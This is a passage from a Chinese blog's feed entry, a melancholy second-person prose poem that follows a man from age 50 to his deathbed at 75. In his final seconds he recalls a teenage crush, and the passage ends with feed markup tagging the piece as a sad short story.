在孩子回自己屋的路上好像叨叨了一句<br>“我不想活的像你一样”<br>怎么就哭了呢？50岁的人了<br>一定是酒太辣了，对不对<br>一定是酒太辣了<br>55岁，孩子工作了，似乎有一点理解你了<br>但你却反了过来，你说不要妥协<br>56岁，孩子也结婚了<br>你问他喜欢那个姑娘么<br>他愣了愣说：喜欢吧<br>60岁，辛苦了一辈子，想出去走走<br>身边的那个人过了30年<br>你依旧分不清到底喜不喜欢<br>你们开始规划旅游路线<br>这么多年了<br>你们还是存在分歧，还是在争吵<br>某个瞬间，你觉得<br>这样可能也挺好<br>一切都准备好了<br>儿子说：爸妈，我工作太忙了<br>可以帮我照顾一下孩子么<br>你们退了机票，又回到了30年前<br>70岁，孩子的孩子也长大了，<br>不用天天操心了<br>你下定决心说：一定要去玩一趟<br>可是手边的拐杖<br>只能支持你走到楼下的花园<br>75岁，你在医院的病床上<br>身边聚满了人，<br>你迷迷糊糊的看见医生摇了摇头<br>周围那些人神情肃穆<br>你明白了，你要死掉了<br>你没有感到一丝害怕<br>你突然问自己，<br>我到底是什么时候死掉的呢？<br>你想起来30岁的那场婚礼<br>原来，那时候，你就死掉了吧<br>依照惯例 死前的3秒，<br>你的大脑要走马灯 倒叙你这75个年头的一生 画面一张一张的过<br>1秒 2秒 两秒过去了 你面无表情的看着这两秒内的回忆<br>第3秒 突然你笑了<br>原来已经回到了15岁的那一年 你看见一个男孩 他叼着一袋牛奶，<br>背着书包 从另一个女孩家的阳台下跑过 那个男孩朝窗户里看了看<br>那是15岁的你暗恋的那个女孩子<br>你想不起来她长什么样子了<br>最后一秒你努力的回忆着<br>然后终于笑了出来<br>3秒过去了 身边的人突然间开始嚎啕大哭 你可能听不清了<br>你最后听到的嘈杂的声音<br>是一群十五六的少年<br>起着哄说的 答应他 答应他 答应他!</p><p><img src="\img\人生.jpg" alt="人生"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;35岁 你因为身体越来越差&lt;br&gt;加班越来越少&lt;br&gt;晋升的速度也越来越缓慢&lt;br&gt;那天下班，媳妇告诉你&lt;br&gt;孩子要上幼儿园了&lt;br&gt;双语的一个月3000&lt;br&gt;你皱了皱眉头，那边就已经不耐烦了&lt;br&gt;“四单元的老王家孩子，一个月6000”&lt;br&gt;“你已经这样了，你想让孩
      
    
    </summary>
    
      <category term="故事短句" scheme="http://yoursite.com/categories/%E6%95%85%E4%BA%8B%E7%9F%AD%E5%8F%A5/"/>
    
    
      <category term="丧" scheme="http://yoursite.com/tags/%E4%B8%A7/"/>
    
  </entry>
  
</feed>
